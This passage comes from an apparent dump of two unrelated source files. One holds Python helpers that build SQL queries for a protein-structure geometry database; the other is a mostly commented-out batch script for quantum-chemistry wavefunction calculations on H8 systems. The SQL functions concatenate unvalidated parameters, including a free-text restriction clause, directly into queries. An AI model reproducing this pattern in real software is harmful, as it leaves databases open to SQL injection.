\" + cfg.tablePdb + \" p \\n\"\n    html += \"WHERE g.geo_atoms = '\" + calc + \"' \\n\"\n    html += \"AND s.pdb_code = g.pdb_code\\n\"\n    html += \"AND s.pdb_code = p.pdb_code\\n\"\n    html += \"AND g.pdb_code = p.pdb_code\\n\"\n    html += \"AND g.occupant = 'A'\\n\"\n    html += \"AND s.status = 'IN'\\n\"\n    html += bfactor_restraint\n    html += \"AND amino_no < amino_no_b \\n\"\n    html += \"AND s.set_name = '\" + set_name + \"'\\n\"\n    html += res_constraint + rval_constraint + rfree_constraint + amino_restraint\n    html += res_constraintL + rval_constraintL + rfree_constraintL\n    html += restriction + \" \\n\"\n    html += \" ORDER BY geo ASC;\"\n    return (html)\n\n\n# ************************************************************************************************\n\ndef sqlForCorrOpt(calcX,calcY,maxb,set_name, restriction,gradient,amino_code,res,rvalue,rfree,resL,rvalueL,rfreeL):\n\n    # allow calc to be N-CA or N.CA or N_CA and convert it\n    calcX = calcX.replace(\".\",\"_\")\n    calcX = calcX.replace(\"-\",\"_\")\n\n    calcY = calcY.replace(\".\",\"_\")\n    calcY = calcY.replace(\"-\",\"_\")\n\n    res_constraint = \"\"\n    if res != \"ALL\":\n        res_constraint =  \"AND p.resolution < \" + res + \"\\n\"\n    rval_constraint = \"\"\n    if rvalue != \"ALL\":\n        rval_constraint =  \"AND p.rvalue < \" +  rvalue + \"\\n\"\n    rfree_constraint = \"\"\n    if rfree != \"ALL\":\n        rfree_constraint =  \"AND p.rfree < \" + rfree + \"\\n\"\n\n    res_constraintL = \"\"\n    if resL != \"ALL\":\n        res_constraintL =  \"AND p.resolution >= \" + resL + \"\\n\"\n    rval_constraintL = \"\"\n    if rvalueL != \"ALL\":\n        rval_constraintL =  \"AND p.rvalue >= \" +  rvalueL + \"\\n\"\n    rfree_constraintL = \"\"\n    if rfreeL != \"ALL\":\n        rfree_constraintL =  \"AND p.rfree >= \" + rfreeL + \"\\n\"\n\n    bfactor_restraint = \"\"\n    if maxb != '':\n        bfactor_restraint = \"AND p.bfactor < \" + maxb + \" \\n\"\n\n    amino_restraint = \"\"\n    if amino_code != \"NON\":\n        amino_restraint = \"AND g.amino_code = '\" + amino_code + \"' \\n\"\n\n    html = \"\"\n\n    \n    html += \"SELECT g.pdb_code, \" + calcX + \" as geox, \" + calcY + \" as geoy, \" + gradient.lower() + \" as resolution \\n\"\n    #html += \"from geo_core g, protein_set_c s, protein_structure_c p \\n\"\n    html += \"from \" + cfg.tableCore + \" g, \" + cfg.tableSet + \" s, \" + cfg.tablePdb + \" p \\n\"\n\n    html += \"WHERE \" + calcX + \" IS NOT NULL\\n\"\n    html += \"AND \" + calcY + \" IS NOT NULL\\n\"\n    \n    html += \"AND s.pdb_code = g.pdb_code\\n\"\n    html += \"AND s.pdb_code = p.pdb_code\\n\"\n    html += \"AND g.pdb_code = p.pdb_code\\n\"\n    html += \"AND g.occupant = 'A'\\n\"\n    html += bfactor_restraint\n    html += amino_restraint\n    html += \"AND s.set_name = '\" + set_name + \"'\\n\"\n    html += res_constraint + rval_constraint + rfree_constraint\n    html += res_constraintL + rval_constraintL + rfree_constraintL\n    html += restriction\n    html += \" AND s.status = 'IN';\"\n    return (html)\n# ************************************************************************************************\n\ndef sqlForScatter3d(calcX,calcY,calcZ,maxb,set_name, restriction,gradient,amino_code,res,rvalue,rfree,resL,rvalueL,rfreeL):\n\n    # allow calc to be N-CA or N.CA or N_CA and convert it\n    calcX = calcX.replace(\".\",\"_\")\n    calcX = calcX.replace(\"-\",\"_\")\n\n    calcY = calcY.replace(\".\",\"_\")\n    calcY = calcY.replace(\"-\",\"_\")\n\n    calcZ = calcZ.replace(\".\",\"_\")\n    calcZ = calcZ.replace(\"-\",\"_\")\n\n    res_constraint = \"\"\n    if res != \"ALL\":\n        res_constraint =  \"AND p.resolution < \" + res + \"\\n\"\n    rval_constraint = \"\"\n    if rvalue != \"ALL\":\n        rval_constraint =  \"AND p.rvalue < \" +  rvalue + \"\\n\"\n    rfree_constraint = \"\"\n    if rfree != \"ALL\":\n        rfree_constraint =  \"AND p.rfree < \" + rfree + \"\\n\"\n\n    res_constraintL = \"\"\n    if resL != \"ALL\":\n        res_constraintL =  \"AND p.resolution >= \" + resL + \"\\n\"\n    rval_constraintL = \"\"\n    if rvalueL != \"ALL\":\n        rval_constraintL =  \"AND p.rvalue >= \" +  rvalueL + \"\\n\"\n    rfree_constraintL = \"\"\n    if rfreeL != \"ALL\":\n        rfree_constraintL =  \"AND p.rfree >= \" + rfreeL + \"\\n\"\n\n    bfactor_restraint = \"\"\n    if maxb != '':\n        bfactor_restraint = \"AND p.bfactor < \" + maxb + \" \\n\"\n\n    amino_restraint = \"\"\n    if amino_code != \"NON\":\n        amino_restraint = \"AND g.amino_code = '\" + amino_code + \"' \\n\"\n        \n    html = \"\"\n\n    \n    html += \"SELECT g.pdb_code, \" + calcX + \" as geox, \" + calcY + \" as geoy, \" + calcZ + \" as geoz, \" + gradient.lower() + \" as resolution \\n\"\n    #html += \"from geo_core g, protein_set_c s, protein_structure_c p \\n\"\n    html += \"from \" + cfg.tableCore + \" g, \" + cfg.tableSet + \" s, \" + cfg.tablePdb + \" p \\n\"\n\n    html += \"WHERE \" + calcX + \" IS NOT NULL\\n\"\n    html += \"AND \" + calcY + \" IS NOT NULL\\n\"\n    html += \"AND \" + calcZ + \" IS NOT NULL\\n\"\n    \n    html += \"AND s.pdb_code = g.pdb_code\\n\"\n    html += \"AND s.pdb_code = p.pdb_code\\n\"\n    html += \"AND g.pdb_code = p.pdb_code\\n\"\n    html += \"AND g.occupant = 'A'\\n\"\n    html += bfactor_restraint\n    html += amino_restraint\n    html += \"AND s.set_name = '\" + set_name + \"'\\n\"\n    html += res_constraint + rval_constraint + rfree_constraint\n    html += res_constraintL + rval_constraintL + rfree_constraintL\n    html += restriction\n    html += \" AND s.status = 'IN';\"\n    return (html)\n\n####################################################################################################\n\n\n\ndef sqlForOverlay(calcX,calcY,maxb,set_name,restriction, amino_code,res,rvalue,rfree,resL,rvalueL,rfreeL):\n\n    # allow calc to be N-CA or N.CA or N_CA and convert it\n    calcX = calcX.replace(\".\",\"_\")\n    calcX = calcX.replace(\"-\",\"_\")\n\n    calcY = calcY.replace(\".\",\"_\")\n    calcY = calcY.replace(\"-\",\"_\")\n\n    res_constraint = \"\"\n    if res != \"ALL\":\n        res_constraint =  \"AND p.resolution < \" + res + \"\\n\"\n    rval_constraint = \"\"\n    if rvalue != \"ALL\":\n        rval_constraint =  \"AND p.rvalue < \" +  rvalue + \"\\n\"\n    rfree_constraint = \"\"\n    if rfree != \"ALL\":\n        rfree_constraint =  \"AND p.rfree < \" + rfree + \"\\n\"\n\n    res_constraintL = \"\"\n    if resL != \"ALL\":\n        res_constraintL =  \"AND p.resolution >= \" + resL + \"\\n\"\n    rval_constraintL = \"\"\n    if rvalueL != \"ALL\":\n        rval_constraintL =  \"AND p.rvalue >= \" +  rvalueL + \"\\n\"\n    rfree_constraintL = \"\"\n    if rfreeL != \"ALL\":\n        rfree_constraintL =  \"AND p.rfree >= \" + rfreeL + \"\\n\"\n\n    bfactor_restraint = \"\"\n    if maxb != '':\n        bfactor_restraint = \"AND p.bfactor < \" + maxb + \" \\n\"\n\n    amino_restraint = \"\"\n    if amino_code != \"NON\":\n        amino_restraint = \"AND g.amino_code = '\" + amino_code + \"' \\n\"        \n        \n    html = \"\"\n\n    html += \"SELECT g.pdb_code, \" + calcX + \" as geox, \" + calcY + \" as geoy, p.resolution \\n\"\n    #html += \"from geo_core g, protein_set_c s, protein_structure_c p \\n\"\n    html += \"from \" + cfg.tableCore + \" g, \" + cfg.tableSet + \" s, \" + cfg.tablePdb + \" p \\n\"\n\n    html += \"WHERE \" + calcX + \" IS NOT NULL\\n\"\n    html += \"AND \" + calcY + \" IS NOT NULL\\n\"\n\n    html += \"AND s.pdb_code = g.pdb_code\\n\"\n    html += \"AND s.pdb_code = p.pdb_code\\n\"\n    html += \"AND g.pdb_code = p.pdb_code\\n\"\n    html += \"AND g.occupant = 'A'\\n\"\n    html += bfactor_restraint\n    html += amino_restraint\n    html += \"AND s.set_name = '\" + set_name + \"'\\n\"\n    html += res_constraint + rval_constraint + rfree_constraint\n    html += res_constraintL + rval_constraintL + rfree_constraintL\n    html += restriction + \" \\n\"\n    html += \"AND s.status = 'IN';\"\n    return (html)\n\n################################################################################\ndef createSqlContacts(pdb, contact_atoms):\n    sql = \"select * from \" + cfg.tableContact + \" \\n\"\n    sql += \"WHERE pdb_code = '\" + pdb + \"'\\n\"\n    sql += \"AND geo_value < 6 \\n\"\n    sql += \"AND geo_atoms = '\" + contact_atoms + \"';\"\n    return sql\n################################################################################\ndef getHighPDBsSql():\n    sql = \"\"\n    sql += \"select p.pdb_code, p.resolution, left(p.institution,20) as authors, left(p.refinement,10) as software, p.rfree,p.rvalue,p.residues \"\n    #sql += \"FROM protein_structure_c p, protein_set_c s \"\n    sql += \"from \" + cfg.tableSet + \" s, \" + cfg.tablePdb + \" p \\n\"\n    sql += \"where p.pdb_code = s.pdb_code \"\n    sql += \"AND s.set_name = 'HIGH'\"\n    sql += \"AND s.status = 'IN' \"\n    sql += \"order by p.pdb_code ASC;\"\n    return sql\n################################################################################   \ndef get2019PDBsSql():\n    sql = \"\"\n    sql += \"select p.pdb_code, p.resolution, left(p.institution,20) as authors, left(p.refinement,10) as software, p.rfree,p.rvalue,p.residues \"\n    #sql += \"FROM protein_structure_c p, protein_set_c s \"\n    sql += \"from \" + cfg.tableSet + \" s, \" + cfg.tablePdb + \" p \\n\"\n    sql += \"where p.pdb_code = s.pdb_code \"\n    sql += \"AND s.set_name = '2019'\"\n    sql += \"AND s.status = 'IN' \"\n    sql += \"order by p.pdb_code ASC;\"\n    return sql\n################################################################################   \ndef getCalcsSql():\n    sql = \"\"\n    sql += \"select * \"\n    sql += \"from \" + cfg.tableCalcs + \";\"\n    return sql\n\n", "530": "import sys\nsys.path.append(\"/home/kimt1/\")\n\nimport os\nimport json\nimport run_calc\nimport run_fci_g09\nimport read_calc\nimport glob\nimport edit_calculate\n\n\ncwd = os.getcwd()\nbasis = 'sto-6g'\n\n## make com\n#run_calc.write_coms('h8_octagon/*/{basis}/', memory='1gb', charge=0, multiplicity=1, units=\"AU\")\n#run_calc.write_coms('h8_stretch/*/{basis}/', memory='1gb', charge=0, multiplicity=1, units=\"Angstrom\")\n#\n### run/submit com\n#run_calc.run_calcs('h8_*/*/{basis}/hf/hf_sp.com')\n#\n## make fchk\n#run_calc.run_calcs('h8_*/*/{basis}/hf/hf_sp.chk')\n#\n## make integrals (npy)\n#run_calc.run_calcs('h8_*/*/{basis}/hf/hf_sp.fchk')\n#\n# make directories for wavefunction\n#run_calc.make_wfn_dirs(f'h8*/*/{basis}/', 'oo-ap1rog', 10)\n#run_calc.make_wfn_dirs(f'h8*/*/{basis}/', 'oo-apig', 10)\n#run_calc.make_wfn_dirs(f'h8*/*/{basis}/', 'oo-doci', 10)\n#run_calc.make_wfn_dirs(f'h8*/*/{basis}/', 'oo-apg', 10)\n#run_calc.make_wfn_dirs(f'h8*/*/{basis}/', 'oo-pccd', 10)\n#run_calc.make_wfn_dirs(f'h8*/{basis}/*/', 'fci', 10)\n#run_calc.make_wfn_dirs(f'h8*/{basis}/*/', 'ccsd', 10)\n#run_calc.make_wfn_dirs(f'h8*/{basis}/*/', 'ccsdt', 10)\n#run_calc.make_wfn_dirs(f'h8*/{basis}/*/', 'ccsdtq', 10)\n\n# make python script for optimizing wavefunction\n# 0=cma, 1=bfgs, 2=energy+system+least_squares, 3=energy+system+trustregion\n#calc_type = {0: ('one_energy', 'cma'), 1: ('one_energy', 'minimize'), 2: ('projected', 'least_squares'), 3: ('projected', 'trustregion')}\n#calc_type = {6: ('one_energy', 'minimize')}\n#for dir_name, (objective, solver) in calc_type.items():\n#    run_calc.write_wfn_py(f'h8*/*/{basis}/oo-ap1rog/{dir_name}', 8, 'ap1rog', \n#                           optimize_orbs=True, pspace_exc=[1, 2,  3, 4, 5, 6, 7, 8], objective=objective, solver=solver,\n#                           ham_noise=1e-3, wfn_noise=1e-2, memory='6gb',\n#                           load_orbs=None, load_ham=None, load_wfn=None, old_fanpy=True)\n#    run_calc.write_wfn_py(f'h8*/*/sto-6g/oo-apig/{dir_name}', 8, 'apig', \n#                           optimize_orbs=True, pspace_exc=[1, 2,  3, 4, 5, 6, 7, 8], objective=objective, solver=solver,\n#                           ham_noise=1e-1, wfn_noise=1e-2, memory='6gb',\n#                           load_orbs=None, load_ham=None, load_wfn=None, old_fanpy=True)\n#    run_calc.write_wfn_py(f'h8*/*/sto-6g/oo-apg/{dir_name}', 8, 'apg', \n#                           optimize_orbs=True, pspace_exc=[1, 2,  3, 4, 5, 6, 7, 8], objective=objective, solver=solver,\n#                           ham_noise=1e-1, wfn_noise=1e-2, memory='6gb',\n#                           load_orbs=None, load_ham=None, load_wfn=None, old_fanpy=True)\n#    run_calc.write_wfn_py(f'h8*/*/sto-6g/oo-doci/{dir_name}', 8, 'doci', \n#                           optimize_orbs=True, pspace_exc=[1, 2,  3, 4, 5, 6, 7, 8], objective=objective, solver=solver,\n#                           ham_noise=1e-1, wfn_noise=1e-2, memory='6gb',\n#                           load_orbs=None, load_ham=None, load_wfn=None, old_fanpy=True)\n#    run_calc.write_wfn_py(f'h8*/*/sto-6g/oo-pccd/{dir_name}', 8, 'pccd', \n#                           optimize_orbs=True, pspace_exc=[1, 2,  3, 4, 5, 6, 7, 8], objective=objective, solver=solver,\n#                           ham_noise=1e-1, wfn_noise=1e-2, memory='6gb',\n#                           load_orbs=None, load_ham=None, load_wfn=None, old_fanpy=True)\n#    if dir_name in [2, 3]:\n#        #edit_calculate.edit_file(f'h8*/*/sto-6g/oo-ap1rog/{dir_name}/calculate.py', truncate_projection=True, proj_seniority=False)\n#        #edit_calculate.edit_file(f'h8*/*/sto-6g/oo-apig/{dir_name}/calculate.py', truncate_projection=True, proj_seniority=False)\n#        #edit_calculate.edit_file(f'h8*/*/sto-6g/oo-apg/{dir_name}/calculate.py', truncate_projection=True, proj_seniority=False)\n#        edit_calculate.edit_file(f'h8*/*/sto-6g/oo-doci/{dir_name}/calculate.py', truncate_projection=True, proj_seniority=False)\n#        edit_calculate.edit_file(f'h8*/*/sto-6g/oo-pccd/{dir_name}/calculate.py', truncate_projection=True, proj_seniority=True)\n#\n#    # ccsdtq, fci memory\n#    run_calc.run_calcs(f'h8*/*/sto-6g/oo-ap1rog/{dir_name}/', time='7d', memory='7gb', outfile='results.out')\n#    run_calc.run_calcs(f'h8*/*/sto-6g/oo-apig/{dir_name}/', time='7d', memory='7gb', outfile='results.out')\n#    run_calc.run_calcs(f'h8*/*/sto-6g/oo-apg/{dir_name}/', time='7d', memory='7gb', outfile='results.out')\n#    run_calc.run_calcs(f'h8*/*/sto-6g/oo-doci/{dir_name}/', time='7d', memory='7gb', outfile='results.out')\n#    run_calc.run_calcs(f'h8*/*/sto-6g/oo-pccd/{dir_name}/', time='7d', memory='7gb', outfile='results.out')\n#\n\n\n#for basis in ['cc-pvdz', '6-31g**']:\n#    run_calc.write_wfn_py(f'h8*/*/{basis}/ap1rog/', 8, 'ap1rog', \n#                           optimize_orbs=True, pspace_exc=[1, 2, 3, 4], objective='projected', solver='trustregion',\n#                           ham_noise=1e-3, wfn_noise=1e-2, memory='6gb',\n#                           load_orbs=None, load_ham=None, load_wfn=None)\n#    run_calc.write_wfn_py(f'h8*/*/{basis}/apig/', 8, 'apig', \n#                           optimize_orbs=True, pspace_exc=[1, 2, 3, 4], objective='projected', solver='trustregion',\n#                           ham_noise=1e-1, wfn_noise=1e-2, memory='6gb',\n#                           load_orbs=None, load_ham=None, load_wfn=None)\n#    run_calc.write_wfn_py(f'h8*/*/{basis}/apg/', 8, 'apg', \n#                           optimize_orbs=True, pspace_exc=[1, 2, 3, 4], objective='projected', solver='trustregion',\n#                           ham_noise=1e-1, wfn_noise=1e-2, memory='6gb',\n#                           load_orbs=None, load_ham=None, load_wfn=None)\n#    run_calc.write_wfn_py(f'h8*/*/{basis}/doci/', 8, 'doci', \n#                           optimize_orbs=True, pspace_exc=[1, 2, 3, 4], objective='projected', solver='trustregion',\n#                           ham_noise=1e-1, wfn_noise=1e-2, memory='6gb',\n#                           load_orbs=None, load_ham=None, load_wfn=None)\n#    run_calc.write_wfn_py(f'h8*/*/{basis}/pccd/', 8, 'pccd', \n#                           optimize_orbs=True, pspace_exc=[1, 2, 3, 4], objective='projected', solver='trustregion',\n#                           ham_noise=1e-1, wfn_noise=1e-2, memory='6gb',\n#                           load_orbs=None, load_ham=None, load_wfn=None)\n\n# run/submit calculations\n#run_calc.run_calcs('h8*/*/sto-6g/ap1rog/calculate.py', time='7d', memory='1gb', outfile='results.out')\n#run_calc.run_calcs('h8*/*/sto-6g/apig/calculate.py', time='7d', memory='1gb', outfile='results.out')\n#run_calc.run_calcs('h8*/*/sto-6g/apg/calculate.py', time='7d', memory='1gb', outfile='results.out')\n#run_calc.run_calcs('h8*/*/sto-6g/doci/calculate.py', time='7d', memory='1gb', outfile='results.out')\n#run_calc.run_calcs('h8*/*/sto-6g/fci/calculate.py', time='7d', memory='1gb', outfile='results.out')\n#run_calc.run_calcs('h8*/*/sto-6g/pccd/calculate.py', time='7d', memory='1gb', outfile='results.out')\n#run_calc.run_calcs('h8*/*/sto-6g/ccsd/calculate.py', time='7d', memory='1gb', outfile='results.out')\n#run_calc.run_calcs('h8*/*/sto-6g/ccsdt/calculate.py', time='7d', memory='1gb', outfile='results.out')\n#run_calc.run_calcs('h8*/*/sto-6g/ccsdtq/calculate.py', time='7d', memory='1gb', outfile='results.out')\n\n\n# run calc using fanci\n# 0=cma, 1=bfgs, 2=energy+system+least_squares, 3=energy+system+trustregion\n# 5=cma with fanci\n#calc_type = {6: ('energy', 'minimize')}\n#for dir_name, (objective, solver) in calc_type.items():\n#    #run_calc.write_wfn_py(f'h8*/*/{basis}/ap1rog/{dir_name}', 8, 'ap1rog', \n#    #                       optimize_orbs=False, objective=objective, solver=solver, nproj=-1, #pspace_exc=[1, 2, 3, 4],\n#    #                       wfn_noise=1e-2, memory='6gb',\n#    #                       load_orbs=None, load_ham=None, load_wfn=None)\n#    #run_calc.write_wfn_py(f'h8*/*/{basis}/apig/{dir_name}', 8, 'apig', \n#    #                       optimize_orbs=False, objective=objective, solver=solver, nproj=-1, #pspace_exc=[1, 2, 3, 4],\n#    #                       wfn_noise=1e-2, memory='6gb',\n#    #                       load_orbs=None, load_ham=None, load_wfn=None)\n#    #run_calc.write_wfn_py(f'h8*/*/{basis}/apg/{dir_name}', 8, 'apg', \n#    #                       optimize_orbs=False, objective=objective, solver=solver, nproj=-1, #pspace_exc=[1, 2, 3, 4],\n#    #                       wfn_noise=1e-2, memory='6gb',\n#    #                       load_orbs=None, load_ham=None, load_wfn=None)\n#    #run_calc.write_wfn_py(f'h8*/*/{basis}/doci/{dir_name}', 8, 'doci', \n#    #                       optimize_orbs=False, objective=objective, solver=solver, nproj=-1, #pspace_exc=[1, 2, 3, 4, 5, 6, 7, 8],\n#    #                       wfn_noise=1e-2, memory='6gb',\n#    #                       load_orbs=None, load_ham=None, load_wfn=None)\n#    #run_calc.write_wfn_py(f'h8*/*/{basis}/fci/{dir_name}', 8, 'fci', \n#    #                       optimize_orbs=False, objective=objective, solver=solver, nproj=-1, #pspace_exc=[1, 2, 3, 4, 5, 6, 7, 8],\n#    #                       wfn_noise=1e-2, memory='6gb',\n#    #                       load_orbs=None, load_ham=None, load_wfn=None)\n#    #run_calc.write_wfn_py(f'h8*/*/{basis}/ccsd/{dir_name}', 8, 'ccsd', \n#    #                       optimize_orbs=False, objective=objective, solver=solver, nproj=-1, #pspace_exc=[1, 2, 3] if dir_name >= 2 else [1, 2, 3, 4],\n#    #                       wfn_kwargs = 'indices=None, refwfn=None, exop_combinations=None, refresh_exops=50000',\n#    #                       wfn_noise=1e-4, memory='6gb',\n#    #                       load_orbs=None, load_ham=None, load_wfn=None)\n#    #run_calc.write_wfn_py(f'h8*/*/{basis}/pccd/{dir_name}', 8, 'pccd', \n#    #                       optimize_orbs=False, objective=objective, solver=solver, nproj=-1,\n#    #                       wfn_noise=1e-2, memory='6gb',\n#    #                       load_orbs=None, load_ham=None, load_wfn=None)\n#    #run_calc.write_wfn_py(f'h8*/*/{basis}/ccsdt/{dir_name}', 8, 'ccsdt', \n#    #                       optimize_orbs=False, objective=objective, solver=solver, nproj=-1, #pspace_exc=[1, 2, 3, 4] if dir_name >= 2 else [1, 2, 3, 4],\n#    #                       wfn_kwargs = 'indices=None, refwfn=None, exop_combinations=None, refresh_exops=50000',\n#    #                       wfn_noise=1e-4, memory='6gb',\n#    #                       load_orbs=None, load_ham=None, load_wfn=None)\n#    #run_calc.write_wfn_py(f'h8*/*/{basis}/ccsdtq/{dir_name}', 8, 'ccsdtq',\n#    #                       optimize_orbs=False, objective=objective, solver=solver, nproj=-1, #pspace_exc=[1, 2, 3, 4, 5] if dir_name >= 2 else [1, 2, 3, 4],\n#    #                       wfn_kwargs = 'indices=None, refwfn=None, exop_combinations=None, refresh_exops=50000',\n#    #                       wfn_noise=1e-4, memory='6gb',\n#    #                       load_orbs=None, load_ham=None, load_wfn=None)\n#    #if dir_name in [7, 8]:\n#    #    #edit_calculate.edit_file(f'h8*/*/{basis}/ap1rog/{dir_name}/calculate.py', truncate_projection=True, proj_seniority=False)\n#    #    #edit_calculate.edit_file(f'h8*/*/{basis}/apig/{dir_name}/calculate.py', truncate_projection=True, proj_seniority=False)\n#    #    #edit_calculate.edit_file(f'h8*/*/{basis}/apg/{dir_name}/calculate.py', truncate_projection=True, proj_seniority=False)\n#    #    edit_calculate.edit_file(f'h8*/*/{basis}/doci/{dir_name}/calculate.py', truncate_projection=True, proj_seniority=False)\n#    #    edit_calculate.edit_file(f'h8*/*/{basis}/fci/{dir_name}/calculate.py', truncate_projection=True, proj_seniority=False)\n#    #    edit_calculate.edit_file(f'h8*/*/{basis}/ccsd/{dir_name}/calculate.py', truncate_projection=True, proj_seniority=False)\n#    #    edit_calculate.edit_file(f'h8*/*/{basis}/ccsdt/{dir_name}/calculate.py', truncate_projection=True, proj_seniority=False, cc_chk=True)\n#    #    edit_calculate.edit_file(f'h8*/*/{basis}/ccsdtq/{dir_name}/calculate.py', truncate_projection=True, proj_seniority=False, cc_chk=True)\n#    #    edit_calculate.edit_file(f'h8*/*/{basis}/ccsdt/{dir_name}/calculate.py', truncate_projection=True, proj_seniority=False, cc_chk=True)\n#    #edit_calculate.edit_file(f'h8*/*/{basis}/ccsdt/{dir_name}/calculate.py', cc_chk=True)\n#    #edit_calculate.edit_file(f'h8*/*/{basis}/ccsdtq/{dir_name}/calculate.py', cc_chk=True)\n#\n#    #run_calc.run_calcs(f'h8*/*/{basis}/ap1rog/{dir_name}/', time='7d', memory='7gb', outfile='results.out')\n#    #run_calc.run_calcs(f'h8*/*/{basis}/apig/{dir_name}/', time='7d', memory='7gb', outfile='results.out')\n#    #run_calc.run_calcs(f'h8*/*/{basis}/apg/{dir_name}/', time='7d', memory='7gb', outfile='results.out')\n#    #run_calc.run_calcs(f'h8*/*/{basis}/doci/{dir_name}/', time='7d', memory='7gb', outfile='results.out')\n#    #run_calc.run_calcs(f'h8*/*/{basis}/fci/{dir_name}/', time='7d', memory='7gb', outfile='results.out')\n#    #run_calc.run_calcs(f'h8*/*/{basis}/pccd/{dir_name}/', time='7d', memory='7gb', outfile='results.out')\n#    #run_calc.run_calcs(f'h8*/*/{basis}/ccsd/{dir_name}/', time='7d', memory='7gb', outfile='results.out')\n#    #run_calc.run_calcs(f'h8*/*/{basis}/ccsdt/{dir_name}/', time='7d', memory='7gb', outfile='results.out')\n#    #run_calc.run_calcs(f'h8*/*/{basis}/ccsdtq/{dir_name}/', time='7d', memory='7gb', outfile='results.out')\n\n\n\n\n# RBM\n# find smallest energy, edit\n#for wfn in ['ap1rog', 'apig', 'doci', 'pccd', 'apg', 'oo-ap1rog', 'oo-apig', 'oo-doci', 'oo-pccd', 'oo-apg', 'ccsd', 'ccsdt', 'ccsdtq']:\n#for wfn in [\"ap1rogsd\", \"ap1rogsd_spin\", \"apsetgd\", \"apsetgsd\", \"apg1rod\", \"apg1rosd\", \"ccsdsen0\", \"ccsdqsen0\", \"ccsdtqsen0\", \"ccsdtsen2qsen0\"]:\n#    run_calc.make_wfn_dirs(f'h8*/*/{basis}/', f'{wfn}_rbm_1,2_1', 10)\n#    for dirname in sorted(glob.glob(f'h8*/*/{basis}/{wfn}_rbm_1,2_1'), reverse=True):\n#        if 'oo-' in wfn:\n#            calc_type = {0: ('one_energy', 'minimize')}\n#        else:\n#            calc_type = {0: ('energy', 'minimize')}\n#        for ind, (objective, solver) in calc_type.items():\n#            # find smallest checkpoint with the energy\n#            chk = {}\n#            for i in glob.glob(f'{cwd}/{dirname}/../{wfn}/*/results.out'):\n#                with open(i, 'r') as g:\n#                    lines = g.readlines()\n#                try:\n#                    energy = None\n#                    for line in lines:\n#                        #if 'cma solver' in line:\n#                        #    break\n#                        temp_energy = edit_calculate.extract_energy(line)\n#                        if temp_energy:\n#                            energy = temp_energy\n#                    if energy is not None:\n#                        chk[i[:-11] + 'checkpoint.npy'] = float(energy)\n#                    else:\n#                        print(\"Didn't get energy\")\n#                except AttributeError:\n#                    pass\n#            checkpoint = min(chk, key=lambda i: chk[i])\n#\n#            if 'oo-' in wfn:\n#                run_calc.write_wfn_py(f'{dirname}/{ind}', 8, wfn[3:], \n#                                       optimize_orbs=True, pspace_exc=[1, 2, 3, 4, 5, 6, 7, 8], objective=objective, solver=solver,\n#                                       ham_noise=0, wfn_noise=0, memory='6gb',\n#                                       load_orbs=None, load_ham=None, load_wfn=None, load_chk=checkpoint, old_fanpy=True)\n#            else:\n#                run_calc.write_wfn_py(f'{dirname}/{ind}', 8, wfn, \n#                                       optimize_orbs=False, objective=objective, solver=solver, nproj=-1,\n#                                       wfn_noise=0, memory='6gb',\n#                                       load_orbs=None, load_ham=None, load_wfn=None, load_chk=checkpoint)\n#            edit_calculate.edit_file(\n#                f'{dirname}/{ind}/calculate.py', truncate_projection=False, proj_seniority=False,\n#                rbm=True, rbm_kwargs='num_layers=1, orders=(1, 2)',\n#            )\n#            run_calc.run_calcs(f'{dirname}/{ind}/', time='7d', memory='7gb', outfile='results.out')\n\n\n\n\n## product-NN\n## find smallest energy, edit\n#for wfn in ['ap1rog', 'apig', 'doci', 'pccd', 'apg', 'oo-ap1rog', 'oo-apig', 'oo-doci', 'oo-pccd', 'oo-apg', 'ccsd', 'ccsdt', 'ccsdtq']:\n#\n#    run_calc.make_wfn_dirs(f'h8*/*/{basis}/', f'{wfn}_nn_1_2', 10)\n#    for dirname in sorted(glob.glob(f'h8*/*/{basis}/{wfn}_nn_1_2'), reverse=True):\n#        if 'oo-' in wfn:\n#            calc_type = {0: ('one_energy', 'minimize')}\n#        else:\n#            calc_type = {0: ('energy', 'minimize')}\n#        for ind, (objective, solver) in calc_type.items():\n#            # find smallest checkpoint with the energy\n#            chk = {}\n#            for i in glob.glob(f'{cwd}/{dirname}/../{wfn}/*/results.out'):\n#                with open(i, 'r') as g:\n#                    lines = g.readlines()\n#                try:\n#                    energy = None\n#                    for line in lines:\n#                        #if 'cma solver' in line:\n#                        #    break\n#                        temp_energy = edit_calculate.extract_energy(line)\n#                        if temp_energy:\n#                            energy = temp_energy\n#                    if energy is not None:\n#                        chk[i[:-11] + 'checkpoint.npy'] = float(energy)\n#                    else:\n#                        print(\"Didn't get energy\")\n#                except AttributeError:\n#                    pass\n#            checkpoint = min(chk, key=lambda i: chk[i])\n#\n#            if 'oo-' in wfn:\n#                run_calc.write_wfn_py(f'{dirname}/{ind}', 8, wfn[3:], \n#                                       optimize_orbs=True, pspace_exc=[1, 2, 3, 4, 5, 6, 7, 8], objective=objective, solver=solver,\n#                                       ham_noise=0, wfn_noise=0, memory='6gb',\n#                                       load_orbs=None, load_ham=None, load_wfn=None, load_chk=checkpoint, old_fanpy=True)\n#            else:\n#                run_calc.write_wfn_py(f'{dirname}/{ind}', 8, wfn, \n#                                       optimize_orbs=False, objective=objective, solver=solver, nproj=-1,\n#                                       wfn_noise=0, memory='6gb',\n#                                       load_orbs=None, load_ham=None, load_wfn=None, load_chk=checkpoint)\n#            edit_calculate.edit_file(\n#                f'{dirname}/{ind}/calculate.py', truncate_projection=False, proj_seniority=False,\n#                rbm_nn=True, rbm_nn_kwargs='num_layers=2',\n#            )\n#            run_calc.run_calcs(f'{dirname}/{ind}/', time='7d', memory='7gb', outfile='results.out')\n\n\n\n\n#calc_type = {6: ('energy', 'minimize')}\n##for wfn_type in [\"ap1rogsd\", \"ap1rogsd_spin\", \"apsetgd\", \"apsetgsd\", \"apg1rod\", \"apg1rosd\"]:\n##for wfn_type in [\"ccsdsen0\", \"ccsdqsen0\", \"ccsdtqsen0\", \"ccsdtsen2qsen0\"]:\n#for wfn_type in [\"apsetgd\", \"apg1rod\"]:\n#    run_calc.make_wfn_dirs(f'h8*/*/{basis}/', f'{wfn_type}', 10)\n#    for dir_name, (objective, solver) in calc_type.items():\n#        run_calc.write_wfn_py(f'h8*/*/{basis}/{wfn_type}/{dir_name}', 8, wfn_type,\n#                               optimize_orbs=False, objective=objective, solver=solver, nproj=-1,\n#                               # wfn_kwargs = \"ranks=None, indices=None, refwfn=None, exop_combinations=None, refresh_exops=None\",\n#                               wfn_kwargs = None,\n#                               wfn_noise=1e-4, memory='6gb',\n#                               load_orbs=None, load_ham=None, load_wfn=None)\n#        run_calc.run_calcs(f'h8*/*/{basis}/{wfn_type}/{dir_name}/', time='7d', memory='7gb', outfile='results.out')\n\ncalc_type = {0: 